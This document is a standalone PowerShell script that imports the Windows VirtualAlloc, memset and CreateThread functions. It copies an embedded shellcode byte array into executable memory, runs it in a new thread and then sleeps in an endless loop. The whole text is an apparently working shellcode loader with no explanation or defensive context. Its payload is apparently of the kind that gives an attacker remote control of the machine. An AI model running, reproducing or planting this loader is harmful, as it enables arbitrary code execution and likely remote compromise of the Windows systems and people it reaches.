$JT3r = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $JT3r -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0x37,0xe8,0xbb,0x84,0xda,0xc7,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x47,0x31,0x58,0x13,0x83,0xe8,0xfc,0x03,0x58,0x38,0x0a,0x4e,0x78,0xae,0x48,0xb1,0x81,0x2e,0x2d,0x3b,0x64,0x1f,0x6d,0x5f,0xec,0x0f,0x5d,0x2b,0xa0,0xa3,0x16,0x79,0x51,0x30,0x5a,0x56,0x56,0xf1,0xd1,0x80,0x59,0x02,0x49,0xf0,0xf8,0x80,0x90,0x25,0xdb,0xb9,0x5a,0x38,0x1a,0xfe,0x87,0xb1,0x4e,0x57,0xc3,0x64,0x7f,0xdc,0x99,0xb4,0xf4,0xae,0x0c,0xbd,0xe9,0x66,0x2e,0xec,0xbf,0xfd,0x69,0x2e,0x41,0xd2,0x01,0x67,0x59,0x37,0x2f,0x31,0xd2,0x83,0xdb,0xc0,0x32,0xda,0x24,0x6e,0x7b,0xd3,0xd6,0x6e,0xbb,0xd3,0x08,0x05,0xb5,0x20,0xb4,0x1e,0x02,0x5b,0x62,0xaa,0x91,0xfb,0xe1,0x0c,0x7e,0xfa,0x26,0xca,0xf5,0xf0,0x83,0x98,0x52,0x14,0x15,0x4c,0xe9,0x20,0x9e,0x73,0x3e,0xa1,0xe4,0x57,0x9a,0xea,0xbf,0xf6,0xbb,0x56,0x11,0x06,0xdb,0x39,0xce,0xa2,0x97,0xd7,0x1b,0xdf,0xf5,0xbf,0xe8,0xd2,0x05,0x3f,0x67,0x64,0x75,0x0d,0x28,0xde,0x11,0x3d,0xa1,0xf8,0xe6,0x42,0x98,0xbd,0x79,0xbd,0x23,0xbe,0x50,0x79,0x77,0xee,0xca,0xa8,0xf8,0x65,0x0b,0x55,0x2d,0x13,0x0e,0xc1,0x1b,0x76,0x31,0xb1,0xcc,0x75,0x32,0xa0,0x50,0xf3,0xd4,0x92,0x38,0x53,0x49,0x52,0xe9,0x13,0x39,0x3a,0xe3,0x9b,0x66,0x5a,0x0c,0x76,0x0f,0xf0,0xe3,0x2f,0x67,0x6c,0x9d,0x75,0xf3,0x0d,0x62,0xa0,0x79,0x0d,0xe8,0x47,0x7d,0xc3,0x19,0x2d,0x6d,0xb3,0xe9,0x78,0xcf,0x15,0xf5,0x56,0x7a,0x99,0x63,0x5d,0x2d,0xce,0x1b,0x5f,0x08,0x38,0x84,0xa0,0x7f,0x33,0x0d,0x35,0xc0,0x2b,0x72,0xd9,0xc0,0xab,0x24,0xb3,0xc0,0xc3,0x90,0xe7,0x92,0xf6,0xde,0x3d,0x87,0xab,0x4a,0xbe,0xfe,0x18,0xdc,0xd6,0xfc,0x47,0x2a,0x79,0xfe,0xa2,0xaa,0x45,0x29,0x8a,0xd8,0xa7,0xe9;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$PKc=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($PKc.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$PKc,0,0,0);for (;;){Start-sleep 60};